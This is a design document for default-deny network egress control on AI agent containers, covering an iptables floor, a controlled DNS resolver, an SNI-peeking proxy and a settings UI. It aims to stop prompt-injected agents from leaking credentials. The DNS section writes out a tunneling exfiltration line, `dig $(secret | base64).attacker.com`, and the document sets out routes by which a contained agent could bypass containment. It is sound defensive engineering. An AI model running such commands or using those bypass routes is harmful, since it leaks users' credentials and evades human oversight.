---
title: Egress control for session containers (Gap 1)
description: Default-deny outbound egress for session containers via a gateway middlebox — iptables floor, controlled DNS, and a transparent allowlisting proxy — delivered in one sequential PR.
issue: https://linear.app/shipit-ai/issue/SHI-90
---

# Egress control for session containers

This is the detailed design for **Gap 1** of [agent containment](./plan.md) (SHI-90):
default-deny outbound network egress for session containers, so a prompt-injected
agent cannot exfiltrate credentials (its own OAuth token, MCP tokens, the brokered
GitHub PAT) to an arbitrary host. Per Anthropic's
[How we contain Claude](https://www.anthropic.com/engineering/how-we-contain-claude),
once approval friction is removed this is the load-bearing environment-layer defense.

It depends on and composes with **SHI-129** (`docs/201-container-api-trust-boundary/`):
that work default-denies the orchestrator API for container-origin requests, which is
what makes egress *settings* (the global toggle, the allowlist) safe to mutate from the
browser — the contained agent can't reach those routes to loosen its own containment.

## Why the current PR is not yet a real control

The first cut (PR for SHI-90) injects `HTTP_PROXY`/`HTTPS_PROXY` into the container and
runs an allowlisting forward proxy in the orchestrator. That is a **policy engine without
enforcement**: the env vars are a convention only cooperative clients honor. The actual
adversary — an injected agent — opens a raw socket that ignores `HTTP_PROXY` and reaches
the internet directly, because the container sits on a normal bridge with full NAT. So the
proxy-by-env-var state contains nothing against the stated threat. The enforcement has to
happen at the **network layer**, below the agent's control.

## Research: how Anthropic's reference devcontainer does it

The reference `.devcontainer/init-firewall.sh` in `anthropics/claude-code` is **pure
`iptables` + `ipset`, no proxy**:

- Default-deny: `iptables -P INPUT/FORWARD/OUTPUT DROP`.
- An `ipset` (`allowed-domains`, `hash:net`) of **destination IPs** is the allowlist,
  matched by `iptables -A OUTPUT -m set --match-set allowed-domains dst -j ACCEPT`.
- The ipset is populated **once at init** by resolving each allowed hostname
  (`dig +noall +answer A "$domain"`); GitHub is added via its published CIDR ranges
  (`gh api meta | jq '(.web + .api + .git)[]' | aggregate`).
- A self-test confirms enforcement: `curl example.com` must fail, `curl api.github.com/zen`
  must succeed.

### The DNS part — and why we must do more than copy it

DNS is allowed **wide open, to any resolver**:

```
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
iptables -A INPUT  -p udp --sport 53 -j ACCEPT
```

This is structural, not an oversight: you can't resolve the allowlist without DNS, and
`iptables` can't parse DNS query *names* (it only sees "UDP to :53"), so the rule can't be
scoped to allowed domains. The consequences are the two things this design must fix:

1. **DNS tunneling is unmitigated.** With port 53 open to any host, an injected agent
   exfiltrates with zero HTTP: `dig $(secret | base64).attacker.com` routes the secret to
   *attacker.com*'s authoritative nameserver via the recursive resolver. The ipset never
   sees it. For a solo-dev devcontainer that is an accepted risk-reduction tradeoff; for
   ShipIt's threat model (credential exfil is the *named* threat) it is **disqualifying**.
2. **Resolve-at-init means stale IPs + a CDN leak.** CDN-fronted hosts (npm, Anthropic)
   rotate IPs, so the pinned ipset breaks long sessions; and an allowed Fastly/Cloudflare
   IP also fronts other sites reachable via SNI on the same IP.

Both weaknesses trace to **not controlling DNS**. That is the correction at the center of
this design.

## Architecture: netns-sidecar enforcement (resolved)

The agent container runs with `CapDrop: ["ALL"]` (no `NET_ADMIN`) and, since SHI-31, as a
non-root user — by design, and we keep it that way. So the firewall/DNS/proxy **cannot and
must not** be administered *by* the agent. But the controls still apply *inside the agent's
own network namespace* — installed from the outside by a trusted, orchestrator-launched
**sidecar that shares the agent's netns** and holds the capability the agent lacks:

```
docker run --network container:<agentId> --cap-add NET_ADMIN  egress-sidecar
       │  (shares the agent container's network namespace; agent itself has no NET_ADMIN)
       ▼
inside the agent netns:
   Tier A  installer (short-lived): iptables default-deny (OUTPUT DROP) + ipset allow-set,
           then exits — rules persist in the netns; the agent can't undo them.
   Tier B  resolver (long-lived sidecar): the only reachable DNS; answers allowlisted names
           only, drives the ipset with the IPs it returns.
   Tier C  transparent proxy (long-lived sidecar): listens on loopback; iptables REDIRECTs
           OUTPUT :443/:53 to it, EXCEPT traffic owned by the sidecar's uid
           (`-m owner --uid-owner`), so the proxy's own egress isn't re-redirected.
```

**Why this over an `internal` network + a separate multi-homed gateway container** (the
earlier sketch): it needs **no second network, no routing/default-gateway changes, and no
cross-container attribution** — everything lives in one netns, so "the agent" and "the
enforcement point" are the same kernel network stack. The agent still can't bypass it (no
`NET_ADMIN` to flush rules; the loopback proxy + owner-match is the istio/cilium-init
pattern), and it composes cleanly A→B→C as sidecars added to the same netns. SHI-31's
non-root agent makes the owner-match exemption unambiguous (agent uid ≠ sidecar uid).

Key properties:
- **Un-bypassable without NET_ADMIN.** A raw socket from the agent is still subject to the
  netns iptables `OUTPUT` policy; there is nothing to unset and no `HTTP_PROXY` to ignore.
- **Transparent.** No env vars in the agent container; REDIRECT happens in the netns.
- **Resolve-before-deny ordering.** The installer fetches `gh api meta` CIDRs and resolves
  allowlisted hostnames *before* setting the `OUTPUT DROP` policy (chicken-and-egg: once
  default-deny is up, the installer itself couldn't reach `api.github.com`). The GitHub
  CIDR fetch is done **orchestrator-side** (it holds the brokered token) and passed in.

## The three tiers (all shipped, sequentially, in one PR)

| Tier | Mechanism | DNS tunneling | CDN / staleness | Allow-once UX | Phase-2 identity hook |
|------|-----------|:---:|:---:|:---:|:---:|
| **A** | iptables default-deny + ipset (Anthropic-style) | ❌ open | ❌ stale / leak | ❌ | ❌ |
| **B** | + controlled resolver that answers only allowlisted names **and** populates the ipset with the IPs it just returned | ✅ closed | ✅ fresh | ⚠️ clunky | ❌ |
| **C** | + transparent SNI/CONNECT proxy for HTTPS | ✅ | ✅ | ✅ | ✅ |

- **Tier A** establishes the un-bypassable floor: internal network, gateway, default-deny,
  ipset matched on destination IP. Steal Anthropic's proven patterns — `gh api meta` CIDR
  for GitHub, resolve-and-pin, the `example.com`-must-fail self-test.
- **Tier B** is the minimum that actually satisfies our exfil threat model. The gateway
  runs the only resolver the container can reach (port 53 allowed *only* to the gateway);
  it refuses/logs non-allowlisted names (killing DNS tunneling) and, on each allowed
  resolution, inserts the returned IPs into the ipset (killing staleness — the ipset always
  matches the live answer). This is the DNS correction over Anthropic's reference.

  > **Tier B host-verification findings (the wiring the design glossed over).** Two netns
  > details only surfaced on a live host (both now fixed; see `checklist.md`):
  > 1. **Getting the agent onto the resolver is an iptables job, not a `--dns` job.** On a
  >    user-defined Docker network the container `--dns` option does *not* rewrite the
  >    agent's resolv.conf nameserver — Docker keeps its embedded resolver (`127.0.0.11`)
  >    as the nameserver and demotes `--dns` to an upstream. Since Tier A drops the
  >    agent→`127.0.0.11`, the only robust hook is to **REDIRECT** the agent's DNS
  >    (`dst 127.0.0.11:53`) to the in-netns dnsmasq at `nat/OUTPUT` (excluding the
  >    resolver's own uid). This is transparent to resolv.conf and tighter than relying on
  >    it. The resolver's listen address (`127.0.0.1:53`) is unchanged.
  > 2. **A long-lived netns sidecar needs a label the compose stale-sweep won't reap.**
  >    Sharing the agent's `shipit-parent-session` label put the resolver in the blast radius
  >    of `killStaleContainers`, which SIGKILLed it the moment the compose stack started. It
  >    now also carries a distinct `shipit-egress-resolver=<sid>` label that the sweep
  >    excludes (parent-session is kept only for destroy-time teardown).
  > 3. **The resolver's internal-name allowlist must track `SHIPIT_HOST`, not a parallel env.**
  >    The worker dials the orchestrator at `SHIPIT_HOST` (`SHIPIT_ORCHESTRATOR_HOST ||
  >    os.hostname()`), but the resolver allowlist read only `SHIPIT_ORCHESTRATOR_HOST` — so
  >    an env that left it unset allowlisted nothing while still pointing the worker at
  >    `os.hostname()`, breaking the callback under Tier B (dnsmasq refuses every name it
  >    isn't told about). Both now derive from one `orchestratorCallbackHost()` so they can't
  >    diverge; prod and the dev compose set `SHIPIT_ORCHESTRATOR_HOST=shipit` for an explicit,
  >    stable alias.
- **Tier C** adds the transparent proxy for L7: hostname-level HTTPS policy that survives
  shared CDN IPs, the **allow-once / add-to-allowlist** interactive flow, per-host
  observability, and the hook for the Phase-2 identity-validating proxy (verify a request
  carries *this* user's token, not an attacker's). The allowlist matcher already written
  (`egress-allowlist.ts`) is reused verbatim; what changes is that traffic reaches it via
  the gateway route rather than an env var.

  > **Tier C implementation notes (C1 enforcement shipped).** The proxy is a tiny,
  > dependency-free **Go** binary (`docker/egress-sidecar/sni-proxy`) baked into the sidecar
  > image via a multi-stage build. It does **not** terminate or decrypt TLS — it peeks the
  > **cleartext SNI** in the ClientHello (reusing crypto/tls's own parser via a
  > `GetConfigForClient` callback that captures `ServerName` and aborts, then replays the
  > recorded bytes to the upstream so the spliced stream is byte-for-byte intact), checks
  > the allowlist, and splices to the original destination (recovered via `SO_ORIGINAL_DST`)
  > or rejects. The installer REDIRECTs the agent's :443 to it, excluding the proxy's own
  > uid (912) so its upstream dials aren't re-redirected; the proxy carries **no
  > `NET_ADMIN`** (only the installer does). Redirecting OUTPUT-chain traffic with an
  > *external* destination to a loopback listener needs `route_localnet` (namespaced), unlike
  > the Tier B DNS redirect whose target (`127.0.0.11`) was already loopback. `route_localnet`
  > is set as a namespaced `HostConfig.Sysctls` on the **agent container at creation** (it owns
  > its netns), NOT by the installer sidecar — that sidecar carries only `NET_ADMIN`, so Docker
  > keeps its `/proc/sys` read-only and an in-script `echo`/`sysctl -w` fails EROFS (a live-host
  > defect). The redirected packet's filter/OUTPUT oif isn't `lo`, so the firewall also adds an
  > explicit `-d 127.0.0.1 --dport $PROXY_PORT ACCEPT` before `-P OUTPUT DROP`, else the
  > REDIRECT'd :443 is dropped.
  >
  > **DNS-layer-first caveat (shapes the allow-once card).** Under Tier B a genuinely-new
  > host can't even be *resolved* (dnsmasq refuses), so the agent never gets an IP and the
  > SNI proxy never sees it. The proxy's unique value — and where the allow-once card fires —
  > is therefore the **CDN co-tenancy / IP-reuse** case (allowlisted IP, non-allowlisted
  > SNI). "Add to allowlist" for a brand-new host must reload the resolver (DNS) and ipset
  > (IP) too; a proactive DNS-layer trigger for brand-new hosts is a C2 follow-up.

### Why one PR, sequentially (and how it stays reviewable)

Tiers A→B→C are not independently *useful* as shipped increments — Tier A alone still
leaks via DNS (the very channel this issue exists to close), so shipping it as "egress
control" would advertise a guarantee we don't yet provide. The tiers also share one
substrate (the gateway container, the internal-network topology, the session attribution),
so splitting them across PRs would mean landing and reverting scaffolding. We therefore
deliver **all three in one PR**, as a sequence of **self-contained commits — one per tier,
each independently green** (build + tests) — so review and `git bisect` stay tractable even
though the unit of *enablement* is the whole thing. The PR closes SHI-90; nothing claims
egress is contained until Tier C lands. The Phase-2 identity-validating proxy remains a
separate follow-up (it builds on the Tier C hook).

## Phase 2 — SNI-scoped identity validation for multi-tenant hosts

Tier C decides allow/deny by **hostname**. That still leaves the residual the threat model
calls out: an allowlisted **multi-tenant** host (S3, GCS, Azure Blob, a shared container
registry, a per-account API) is approved as a *host*, but a request can target the
**attacker's** bucket/account/org on that same host — exfiltration into an attacker identity
on an approved service. Phase 2 implements the `validateIdentity` seam already present in
`sni-proxy/main.go` to close as much of this as is enforceable.

### The hard constraint shapes what's possible

Tier C's whole premise is **no TLS decryption** — SNI-peek only, no CA injection, E2E TLS
intact. So identity validation may use **only** signals visible without decrypting: the
**SNI hostname**, **`SO_ORIGINAL_DST`**, and the per-host rule. The per-request identity that
lives in the HTTP layer — the path/bucket in path-style S3 (`s3.amazonaws.com/<bucket>/…`),
the `Authorization` header, a per-account API key (e.g. an Anthropic *workspace* on
`api.anthropic.com`) — is **encrypted and out of reach**. We deliberately do **not** decrypt
to read it; that would trade away the E2E-TLS guarantee, which is a non-goal.

**What is therefore enforceable: tenant identity that surfaces as a DNS label in the SNI** —
i.e. **virtual-hosted-style** addressing, which the major object stores use:

```
my-bucket.s3.amazonaws.com   my-bucket.s3.us-east-1.amazonaws.com
my-bucket.storage.googleapis.com   myaccount.blob.core.windows.net
```

For a configured multi-tenant **base** host, the proxy extracts the **tenant prefix** (the
SNI labels before the base) and permits the connection only if that prefix is one of the
session's approved identities.

**What is NOT enforceable under SNI-only (and we say so plainly):**

- **Path-style addressing** (`s3.amazonaws.com/<bucket>/…`): the bucket is in the encrypted
  path; the SNI is the bare apex. We cannot tell whose bucket it is. So when an identity rule
  governs a host, the **un-scoped apex SNI is denied by default** — permitting it would be a
  trivial bypass (just switch from virtual-hosted to path-style). An operator who needs
  path-style anyway can opt in explicitly (an empty `""` identity), accepting that identity is
  unenforced for that host.
- **Per-account identity carried only in an auth header / API key** (e.g. distinguishing two
  Anthropic workspaces on `api.anthropic.com`, or two orgs on a path-routed registry): the
  SNI is identical across accounts, so SNI-only cannot separate them. This is a real residual;
  closing it would require either decryption (rejected) or an out-of-process credential broker
  that mints per-identity-scoped tokens (orthogonal — see Gap 2-R).

### Mechanism (`validateIdentity`, `sni-proxy/main.go`)

Read per-host rules from a new env var **`EGRESS_PROXY_IDENTITY_RULES`** — a JSON array, each
entry `{"host": "<base>", "identities": ["<prefix>", …]}`:

- `host` is the multi-tenant **base** host, normalized exactly like the allowlist (a leading
  dot or an exact form both reduce to the same base — the leading dot only affects allowlist
  *matching*, done separately by `decide`, not tenant extraction).
- `identities` are the permitted **tenant prefixes** — the SNI labels before the base
  (`my-bucket` in `my-bucket.s3.amazonaws.com`), compared case-insensitively. An empty `""`
  permits the un-scoped apex (the path-style opt-in above).
- **Unset/empty → no identity scoping** (Tier C behavior is unchanged). Malformed JSON is
  logged and treated as no rules — the orchestrator builds this value, so a parse error is a
  bug, not an attack; failing to "no scoping" (the SNI allowlist still applies) beats
  blackholing the whole session.

The check runs **after** the SNI allowlist decision and **before** dialing upstream, so it is
a pure additional restriction (never a widening) and denies **fast**, like any other Tier C
deny — no held socket. When several rules overlap, the **most-specific (longest-base)** rule
governs, so a tight regional rule isn't loosened by a broad parent rule. Because it needs only
the SNI, `validateIdentity` no longer takes the upstream connection (we don't, and can't,
inspect the request body).

### Env-var contract & orchestrator wiring (now wired)

The proxy-side enforcement (`docker/egress-sidecar/`) defines and consumes
`EGRESS_PROXY_IDENTITY_RULES`. The orchestrator wiring is now in place:

- **`composeEgressIdentityRules`** (`egress-allowlist.ts`) parses + validates the operator
  env **`SESSION_EGRESS_IDENTITY_RULES`** (same JSON shape) into the canonical rules string,
  mirroring `composeEgressExtraHosts`. It also accepts an optional per-session `durableRules`
  hook (for a future per-session editor) and **fails open to `""`** on malformed input —
  identity scoping is additive hardening over the host allowlist, never the floor.
- It flows through **`resolveEgressConfig`** → `ResolvedEgressConfig.identityRules` (a shared
  type that now backs the ~5 wiring sites) → **`launchEgressProxy`** as
  `EGRESS_PROXY_IDENTITY_RULES`, mirroring `EGRESS_PROXY_ALLOWED`; and through
  **`reloadEgressSidecars`** so a live "add to allowlist" reload doesn't drop identity scoping.

**Operator contract:** set `SESSION_EGRESS_IDENTITY_RULES` (JSON array, same shape as the
proxy's var) on the orchestrator deployment to scope multi-tenant hosts. Unset → `""` → the
proxy launch omits the var → no identity scoping (Tier C host-allowlist behavior unchanged).

**Follow-up (still open):** there is no per-session identity *source* yet — only the
operator-global env, so every contained session currently gets the same rules. A per-session
Settings editor would feed `durableRules` (the seam is in place).

## Settings & UX (browser-only, SHI-129-protected)

All egress configuration is mutated **only from the browser**. SHI-129's guard is
default-deny per route: a route is reachable from a container only if it declares
`config: { containerAccessible: true }`, so the egress settings routes are protected
simply by **not** setting that flag — the contained agent cannot reach them to loosen its
own containment. High-value ones may additionally be listed in `HARD_DENY_PREFIXES`
(`isHardDeniedGlobal`) as a backstop, but that is belt-and-suspenders, not the mechanism.
Stored orchestrator-side alongside MCP servers / secrets.

> **Shipped (durable allowlist + Settings UI).** The durable layer is
> `EgressAllowlistStore` (`egress_allowlist` + `egress_settings` SQLite tables via a
> `DatabaseManager` migration): a `'global'` scope for the editor allowlist + global
> toggle, and a per-session scope for per-session extra hosts + a containment override.
> A single closure (`resolveEgressConfig`, built in `index.ts` where the store + the live
> MCP `CredentialStore` are in scope) resolves, per session at container start,
> (a) **whether to contain** it — `override ?? globalEnabled`, default Contained — so Open
> mode skips the firewall install, and (b) the **composed extra-host allowlist**
> (`composeEgressExtraHosts`: `SESSION_EGRESS_ALLOWLIST` + live MCP hosts + durable
> global + durable session) fed into BOTH `buildResolverConfigB64` and `buildProxyAllowed`.
> Browser-only routes live in `api-routes-egress.ts`
> (`GET/PUT /api/egress/settings`, `GET /api/egress/allowlist`,
> `POST/DELETE /api/egress/hosts`, `GET/PUT /api/egress/session/:id`); the client is
> `egress-store.ts` + `SettingsEgress.tsx` (its own Settings → **Network** tab) with an
> `egress_settings` SSE sync. The editor is **first-class**: `GET /api/egress/allowlist`
> (backed by `buildEffectiveAllowlist`) returns the full *effective* list tagged with
> **provenance** (`builtin` / `operator` / `mcp` / `user-global` / `user-session`). The
> **built-in defaults are overridable** — they're a default the user can remove/edit, not a
> hard floor: a removed default is recorded in a reserved `__suppressed_defaults__` scope and
> filtered out of the resolver/proxy `base` (so it's actually closed), and a **"Restore
> defaults"** action (`POST /api/egress/defaults/restore`) clears the suppressions. Only
> **operator** (`SESSION_EGRESS_ALLOWLIST`) and **MCP** hosts stay read-only (they're derived
> live from the deployment env / connected MCP servers, shown under "Also allowed"). The user
> can add/remove/**edit** entries; the Settings editor is loaded **global-only** (`load(null)`,
> see "Surface split" below), so every editable row is global and per-session entries never
> appear there. **"Add to allowlist"** (the Tier C card's `add`) persists durably AND
> live-reloads the running session's resolver + proxy (`egress-reload.ts`) so a brand-new
> host resolves (DNS + dnsmasq `ipset=` auto-pin) and is SNI-permitted with no restart;
> `egress-policy` reconciles its allow-once set against the durable store via an injected
> source so a durably-added host needs no re-card. The reload swap is env-gated (OFF by
> default) and its live-host verification is pending.

- **Global toggle (default ON, fail-secure).** Two modes for the trusted user:
  *Contained* (default-deny + allowlist + prompts) and *Open* (unrestricted egress, no
  prompts — "stop babysitting, let it work"). An unreadable/missing setting resolves to
  *Contained*. The toggle applies at the session's next container start (egress is a
  creation-time network-topology choice; ShipIt recycles containers routinely), and the UI
  states that rather than implying an instant effect.
- **Policy vs. enforcement (default-on, two independent layers).** The durable toggle above is
  the containment **policy**. **Enforcement** is a separate layer: the orchestrator only
  installs the sidecar tiers when enforcement is enabled (`SESSION_EGRESS_ENFORCE !== "0"`,
  **default ON**) AND the sidecar image is configured (`SESSION_EGRESS_SIDECAR_IMAGE`, set in
  all compose files). When policy says Contained but the deployment can't enforce, ShipIt
  **fails closed** — the session refuses to start (`container-lifecycle.ts`) — and the installer
  (`deployment/*/setup.sh`) detects an incapable host at install time and offers the opt-out
  (`SESSION_EGRESS_ENFORCE=0`, persisted where `deploy.sh`/`lib.sh` load it). Because the two
  layers are independent, the API surfaces `enforcementActive` (`EgressSettings` /
  `EgressSessionSettings` / `EgressAllowlistView`) and the Settings panel shows an explicit
  "Contained — NOT enforced on this deployment" warning rather than a false-green "Contained",
  so the UI never claims protection it can't deliver.
- **Per-session override.** "Allow this session to also reach `X`" — the smaller-blast-radius
  version of the global switch, matching the real "I'm debugging one thing" need.

- **Surface split — global vs session controls.** A "Settings" dialog should hold app-wide
  settings only, so the egress UI is split by scope rather than crammed into one tab.
  **Settings → Network** holds the *global* controls only: the containment toggle and the
  global allowlist editor. It loads the effective view with **no session in scope**
  (`load(null)`), so per-session ("This session") rows never render there and every editable
  row is global; adds from the dialog are always global. The one *session-scoped* control —
  the **containment override** (Inherit / Contained / Open) — lives on the session's own
  overflow menu in the sidebar instead, behind a **Session settings** item that opens a
  dialog (`SessionSettingsDialog.tsx`, current session only, wired by direct
  `GET /api/egress/allowlist?session=` + `PUT /api/egress/session/:id`). It was originally a
  bare Radix radio group rendered inline at the bottom of the menu (`SessionEgressMode.tsx`),
  but those `text-sm`, icon-less rows broke the menu's visual rhythm; it now matches the other
  menu rows and lives in a styled dialog with room for future per-session settings.
  - **Note on per-session *hosts*.** The blocked-egress card's "Add to allowlist" persists to
    the **global** scope (`egress-handlers.ts`), and the Settings add-scope toggle was removed,
    so the UI no longer creates per-session host entries — `user-session` remains a valid store
    scope (durable model + `PUT /api/egress/session/:id` override), just without a host-add
    surface. If a per-session host editor is ever wanted, it belongs on a session surface, not
    this global dialog.

- **Pending change + "Restart to apply now" (the deferred-to-next-start signal made visible).**
  Egress is a **creation-time** topology choice — the Tier A firewall, Tier B resolver and
  Tier C proxy are plumbed into the agent netns when the container is *created*
  (`container-lifecycle.ts`). Flipping the per-session mode on a **running** session persists
  the override (`PUT /api/egress/session/:id`) but does **not** re-plumb the live container, so
  the change is invisible until the next container start. Previously the menu gave zero
  indication of this; the dialog now makes it explicit:
  - **Live-mode source of truth.** Container creation records the resolved containment it
    actually started with on the in-memory container record — `SessionContainer.egressContainedAtStart`
    (set from `ResolvedEgressConfig.contained` right where the sidecars are installed). This is
    the only authoritative "what is the live container running" value; the resolved policy
    (`store.resolveContained`) is "what the *next* container would run".
  - **The diff rides the existing view.** `EgressSessionSettings` (the body the dialog already
    GETs via `/api/egress/allowlist?session=` and gets back from the `PUT`) gains
    `startedContained` (the live value, `null` when no running container) and a derived
    `pendingRestart` = `startedContained !== null && startedContained !== effectiveContained`.
    The route reads the live value via `deps.containerManager.get(sessionId)` — an in-memory
    record lookup, **not** the agent's netns — so the value stays on the browser-only egress
    surface (SHI-129); no new container-reachable route. When pending, the dialog shows
    "Pending · applies on next container start".
  - **Restart reuses the existing lifecycle control.** "Restart to apply now" calls the
    existing `POST /api/sessions/:id/container/restart` (the same `services/recovery.ts`
    `restartContainer` already surfaced as "Rescue session" in the SessionHealthStrip — breaker
    + loop-detector resets included), then dispatches the `shipit:reconnect-ws` window event so
    App's WS re-handshakes and the worker reattaches to the fresh container (bridged in
    `useAppBootstrap`, mirroring the rewind-restore bridge). This is **not** a new
    shell-shaped task-runner button (CLAUDE.md §5) — it is "apply the pending change" framed on
    an existing lifecycle action. Restart is **never** automatic on mode selection, and is
    **disabled while an agent turn is running** (`useSessionStore.isLoading`) with an explanatory
    tooltip — restarting would kill the agent (CLAUDE.md never-kill-running-agent rule).
- **Allow-once / add-to-allowlist on block.** When the gateway denies a host, **deny fast**
  (no held sockets) and surface an inline **blocked-egress card** (`host`, allow-once /
  add-to-allowlist / dismiss); the agent retries once the host is permitted. We deliberately
  do *not* hold the TCP connection waiting for a human (client connect-timeouts + prompt
  fatigue + it stalls the turn against §5). "Allow once" is a short-lived grant the next
  attempt consumes. Like other transcript cards, the blocked-egress card must be **persisted**
  (it has a place in scrollback), per the CLAUDE.md side-channel-card rule.

## Allowlist composition

Reuses `egress-allowlist.ts` (already merged on the SHI-90 branch):

- Base list (`EGRESS_DEFAULT_ALLOWLIST`): agent APIs, `.github.com` / `.githubusercontent.com`,
  npm/yarn/pypi, and `.nodejs.org` (node-gyp downloads the Node headers tarball there to
  compile native modules such as `node-pty`; registry fetches alone don't need it, so only
  native builds were affected by its absence).
- Operator extras (`SESSION_EGRESS_ALLOWLIST`) + the browser-managed allowlist above.
- **Live MCP hosts** from the credential store (configured HTTP servers + OAuth providers).
  Post-SHI-129 the agent can no longer add an MCP server from inside the container, so this
  derived set is now user-controlled and tamper-proof — the sub-hole flagged earlier is
  closed.
- GitHub resolved via `gh api meta` CIDR ranges at the gateway (Anthropic's pattern), not
  per-name resolution.

## Relationship to the env-var proxy already on the branch

`egress-proxy.ts` (explicit `HTTP_PROXY` forward proxy) and the `buildEnv` proxy-env
injection were the testable first slice. Under this design the **allowlist matcher is kept**
and the **proxy becomes transparent at the gateway**; the `HTTP_PROXY`/`HTTPS_PROXY`/
`NO_PROXY` env injection is **removed** (no longer needed and never an enforcement boundary).
The `SESSION_EGRESS_PROXY` env flag is superseded by the browser global toggle (env remains
as an operator default / fail-secure floor).

## Key files (planned)

- Gateway provisioning + internal-network topology — `container-lifecycle.ts`,
  `session-container.ts` (extend the existing per-session `createNetwork` to `Internal: true`
  + gateway attachment).
- `egress-gateway.*` (new) — the middlebox: iptables/ipset setup, controlled resolver,
  transparent proxy. NET_ADMIN lives here, never in the agent container.
- `egress-allowlist.ts` (reused) — host matcher + `composeEgressExtraHosts` composition.
- `egress-allowlist-store.ts` (durable allowlist + containment toggle, SQLite) +
  `egress-reload.ts` (live resolver/proxy relaunch on a durable add).
- `docker/egress-sidecar/sni-proxy/main.go` — the Tier C SNI proxy; Phase-2
  `validateIdentity` (SNI-scoped tenant rules from `EGRESS_PROXY_IDENTITY_RULES`) lives here,
  unit-tested in `sni-proxy/main_test.go`.
- Browser-only routes (default-protected by *not* setting `containerAccessible`; golden
  route-table unchanged — no new container route) — `api-routes-egress.ts`,
  `api-container-guard.ts`. The pending-restart diff is computed here from the live record.
- Live-mode source of truth — `SessionContainer.egressContainedAtStart` (`session-container.ts`),
  recorded at container creation in `container-lifecycle.ts` from `ResolvedEgressConfig.contained`;
  exposed as `startedContained` + `pendingRestart` on `EgressSessionSettings`.
- Client: `stores/egress-store.ts` + `components/SettingsEgress.tsx` (Settings → Network,
  **global-only**) + `components/SessionSidebar/SessionSettingsDialog.tsx` (the per-session
  containment override + pending/"Restart to apply now", opened from the **Session settings**
  item on the session's overflow menu; restart reuses `POST /api/sessions/:id/container/restart`
  via the `shipit:reconnect-ws` bridge in `useAppBootstrap.ts`) + `egress_settings` SSE sync in
  `useServerEvents.ts`.
- Blocked-egress card — persisted transcript card (see CLAUDE.md side-channel-card rule):
  `chat-card-persistence.ts`, `chat-history.ts`, client `visual-elements.ts`.

## References

- `anthropics/claude-code` `.devcontainer/init-firewall.sh` (iptables/ipset reference; the
  DNS-open tradeoff).
- `docs/201-container-api-trust-boundary/` (SHI-129) — the browser↔container API boundary
  this relies on.
- `SECURITY-MODEL.md` → "Agent and container containment" / "Known limitations".
- [How we contain Claude](https://www.anthropic.com/engineering/how-we-contain-claude).
